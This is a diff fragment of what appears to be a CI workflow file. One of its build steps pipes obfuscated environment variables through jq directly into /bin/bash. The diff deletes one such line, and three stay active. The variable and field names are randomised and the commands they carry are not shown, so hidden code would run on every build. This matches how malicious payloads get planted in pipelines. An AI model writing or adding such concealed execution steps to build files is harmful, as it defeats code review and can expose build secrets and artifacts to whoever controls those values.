@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$dbft0785" | jq -r .kv6 | /bin/bash
           echo $sffh1312 | jq -r .xe1008 | /bin/bash
-          echo $pymur4 | jq -r .wj68688 | /bin/bash
           echo $h544 | jq -r .fqasp148 | /bin/bash
 
       - name: Upload archive
